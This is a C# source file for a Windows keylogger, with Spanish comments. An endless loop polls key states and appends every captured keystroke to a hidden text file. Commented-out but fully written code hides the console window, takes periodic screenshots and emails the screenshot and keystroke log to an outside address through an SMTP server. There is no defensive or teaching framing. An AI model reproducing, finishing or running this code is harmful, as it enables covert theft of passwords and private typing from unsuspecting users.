using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Configuration;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Windows.Forms;


namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        private extern static int ShowWindow(System.IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 teclas);

        DateTime lastRun = DateTime.Now.AddSeconds(-30);

        static void Main(string[] args)
        {
            //ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
            guardarPulsacion();
        }

        static void guardarPulsacion()
        {
            DateTime ultimaEjecucion = DateTime.Now.AddSeconds(-1);
            string valor=string.Empty;
            while (true)
            {
                try
                {
                    Thread.Sleep(200);
                    for (Int32 i = 32; i < 122; i++)
                    {
                        int tecla = GetAsyncKeyState(i);
                        if (tecla == 1 || tecla == -32767)
                        {
                            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\XXX.txt", true);
                            
                            if (Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey)) && Convert.ToBoolean(GetKeyState(Keys.D1))) valor="|";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey)) && Convert.ToBoolean(GetKeyState(Keys.D2))) valor="@";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey)) && Convert.ToBoolean(GetKeyState(Keys.D3))) valor="#";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.D4))) valor="$";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.D5))) valor="%";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.D6))) valor="&";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.D7))) valor="(";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.D8))) valor=")";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.D9))) valor=")";
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.D0))) valor="=";
                            else if (Keys.OemPeriod.Equals((Keys)i)) valor = ".";
                            else if (Keys.Back.Equals((Keys)i)) valor = "";
                            else if (Keys.Space.Equals((Keys)i)) valor=" ";
                            else if (Keys.D0.Equals((Keys)i) || Keys.NumPad0.Equals((Keys)i)) valor="0";
                            else if (Keys.D1.Equals((Keys)i) || Keys.NumPad1.Equals((Keys)i)) valor="1";
                            else if (Keys.D2.Equals((Keys)i) || Keys.NumPad2.Equals((Keys)i)) valor="2";
                            else if (Keys.D3.Equals((Keys)i) || Keys.NumPad3.Equals((Keys)i)) valor="3";
                            else if (Keys.D4.Equals((Keys)i) || Keys.NumPad4.Equals((Keys)i)) valor="4";
                            else if (Keys.D5.Equals((Keys)i) || Keys.NumPad5.Equals((Keys)i)) valor="5";
                            else if (Keys.D6.Equals((Keys)i) || Keys.NumPad6.Equals((Keys)i)) valor="6";
                            else if (Keys.D7.Equals((Keys)i) || Keys.NumPad7.Equals((Keys)i)) valor="7";
                            else if (Keys.D8.Equals((Keys)i) || Keys.NumPad8.Equals((Keys)i)) valor="8";
                            else if (Keys.D9.Equals((Keys)i) || Keys.NumPad9.Equals((Keys)i)) valor="9";
                            else if (Keys.LButton.Equals((Keys)i) || Keys.MButton.Equals((Keys)i)) { }//no escribe
                            else
                            { //letras
                                if (i >= 65 && i <= 122)
                                {
                                    if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.Capital)))
                                        valor = Convert.ToChar(i + 32).ToString();//MINUSCULA
                                    else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey))) //Mayuscula
                                        valor=Convert.ToChar(i).ToString();
                                    else if (Convert.ToBoolean(GetAsyncKeyState(Keys.Capital)))//Mayuscula
                                        valor=Convert.ToChar(i).ToString();
                                    else valor = Convert.ToChar(i + 32).ToString();//MINUSCULA
                                }
                            }
                            Console.Write(valor + ", ");
                            sw.Write(valor + ", ");
                            sw.Close();
                        }
                    }
                    if (DateTime.Now > ultimaEjecucion)
                    {
                        string fecha = DateTime.Now.ToString("h:mm:ss tt");
                        string nombrefinal = fecha.Trim().Replace(":", "_");
                        //pantallazo(nombrefinal);
                        ultimaEjecucion = DateTime.Now.AddSeconds(30);
                        //mandarPorFTP(nombrefinal);
                        //mandarPorFTP("XXX.txt");
                        //EnviarEmail(Application.StartupPath + @"\"+nombrefinal, Application.StartupPath +   @"\XXX.txt");
                        //new FileInfo(nombrefinal).Delete();
                    }
                }
                catch (Exception ex) { }
            }
        }

//        static void pantallazo(string nombre)
//        {
//            int ancho = Screen.GetBounds(new Point(0, 0)).Width;
//            int alto = Screen.GetBounds(new Point(0, 0)).Height;

//            Bitmap p = new Bitmap(ancho, alto);
//            Graphics grafico = Graphics.FromImage((Image)p);
//            grafico.CopyFromScreen(0, 0, 0, 0, new Size(ancho, alto));
//            p.Save(nombre, ImageFormat.Jpeg);
//        }

        //static bool EnviarEmail(string adjunto1, string adjunto2)
        //{
        //    MailMessage msg = new MailMessage();
        //    msg.To.Add("alguncorreo@gmail.com");
        //    msg.From = new MailAddress("eduardo.romero.inge@gmail.com", "XXX", System.Text.Encoding.UTF8);
        //    msg.Subject = "KeyLogger";
        //    msg.SubjectEncoding = System.Text.Encoding.UTF8;
        //    Attachment item = new Attachment(adjunto1);
        //    Attachment item2 = new Attachment(adjunto2);
        //    msg.Attachments.Add(item);
        //    msg.Attachments.Add(item2);
        //    msg.BodyEncoding = System.Text.Encoding.UTF8;
        //    SmtpClient client = new SmtpClient();
        //    client.UseDefaultCredentials = false;
        //    client.Credentials = new System.Net.NetworkCredential("alguncorreo@hotmail.com", "PASS");
        //    client.Port = 587;
        //    client.Host = "smtp.live.com";
        //    client.EnableSsl = true; //SSL
        //    try
        //    {
        //        client.Send(msg);
        //    }

        //    catch (Exception ex)
        //    {
        //        return false;
        //    }

        //    return true;
        //}

    }  
}
